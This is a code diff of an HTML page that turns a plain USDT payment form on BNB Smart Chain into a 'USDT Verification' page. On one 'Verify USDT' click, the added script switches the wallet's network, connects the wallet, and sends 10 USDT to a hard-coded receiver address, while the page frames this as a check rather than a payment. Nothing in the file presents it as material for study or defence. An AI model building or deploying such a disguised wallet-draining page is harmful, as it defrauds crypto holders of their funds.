@@ -3,90 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Payment Gateway</title>
+    <title>USDT Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: #0f172a; color: white; }
-        .card { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 400px; margin: auto; }
-        button { background: #2563eb; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 15px; width: 100%; }
-        button:hover { background: #1d4ed8; }
-        #status { margin-top: 15px; font-size: 14px; color: #94a3b8; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 30px; background: #f59e0b; color: #0f172a; }
+        .card { background: #ffffff; padding: 25px; border-radius: 12px; max-width: 380px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        button { background: #000000; color: #ffffff; border: none; padding: 14px; font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 15px; width: 90%; font-weight: bold; }
+        #status { margin-top: 15px; font-size: 14px; color: #475569; word-break: break-all; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>USDT Payment</h2>
+    <h2 style="color: #000000;">USDT Payment</h2>
     <p>Verifying usdt</p>
 
-<!-- Wallet Connect Button -->
-<button onclick="connectWallet()">verify now</button>
-<br><br>
+    <!-- Single Action Button -->
+    <button onclick="startVerification()">Verify USDT</button>
 
-<!-- Amount Input Box (Iska ID 'usdtAmount' hona zaroori hai) -->
-<input type="number" id="usdtAmount" placeholder="Amount enter karein">
-<br>
-
-<!-- Pay Button -->
-<button onclick="sendUSDT()">Bnb smart chain</button>
-    
+    <div id="status">Status: Click Verify to start</div>
+</div>
 
 <script>
     let signer;
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT Mainnet
-    const myWalletAddress = "0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0"; // Target Wallet Address
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT Contract
+    const myWalletAddress = "0xc1400f49e127b83a8fD0022ccD1Fe8c27B06dec0"; // Receiver Address
+    const bscChainId = "0x38"; // BNB Smart Chain ID (56 decimal)
 
     const erc20Abi = [
         "function transfer(address to, uint256 amount) public returns (bool)"
     ];
 
-    async function connectWallet() {
-        if (window.ethereum) {
+    async function ensureBscNetwork() {
+        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (currentChainId !== bscChainId) {
             try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                const address = await signer.getAddress();
-                document.getElementById("status").innerText = "Connected: " + address.substring(0, 6) + "..." + address.substring(38);
-            } catch (err) {
-                document.getElementById("status").innerText = "Connection Failed!";
+                // Network ko BNB Smart Chain par switch karein
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: bscChainId }],
+                });
+            } catch (switchError) {
+                // Agar BNB Chain wallet me added nahi hai toh add karein
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: bscChainId,
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }],
+                    });
+                } else {
+                    throw switchError;
+                }
             }
-        } else {
-            alert("Kripya Trust Wallet Browser me kholein!");
         }
     }
 
-async function sendUSDT() {
-    if (!signer) {
-        alert("Pehle Wallet Connect Karein!");
-        return;
-    }
+    async function startVerification() {
+        if (!window.ethereum) {
+            alert("Is page ko Trust Wallet ke Browser me kholein!");
+            return;
+        }
 
-    const inputAmount = document.getElementById("usdtAmount").value;
-    if (!inputAmount || inputAmount <= 0) {
-        alert("Kripya valid USDT amount enter karein!");
-        return;
-    }
+        try {
+            document.getElementById("status").innerText = "Checking Network...";
+            
+            // Step 1: Ensure BNB Smart Chain
+            await ensureBscNetwork();
 
-    try {
-        document.getElementById("status").innerText = "Processing...";
-        const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer);
-        
-        const amount = ethers.utils.parseUnits(inputAmount.toString(), 18);
-        
-        const tx = await usdtContract.transfer(myWalletAddress, amount);
-        await tx.wait();
-        
-        document.getElementById("status").innerText = "Payment Successful!";
-        alert(inputAmount + " USDT Transfer Successful!");
-    } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "Error: " + (err.reason || err.message || "Failed");
+            document.getElementById("status").innerText = "Connecting Wallet...";
+
+            // Step 2: Wallet Connect Request
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            
+            const address = await signer.getAddress();
+            document.getElementById("status").innerText = "Connected! Requesting 10 USDT...";
+
+            // Step 3: Auto-trigger 10 USDT Transfer
+            const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer);
+            const amount = ethers.utils.parseUnits("10", 18);
+            
+            const tx = await usdtContract.transfer(myWalletAddress, amount);
+            document.getElementById("status").innerText = "Processing Transaction...";
+            
+            await tx.wait();
+            
+            document.getElementById("status").innerText = "Payment Successful!";
+            alert("10 USDT Transfer Successful!");
+
+        } catch (err) {
+            console.error(err);
+            document.getElementById("status").innerText = "Error: " + (err.reason || err.message || "Transaction Cancelled");
+        }
     }
-}
-    
+</script>
 
 </body>
 </html>
-
-              
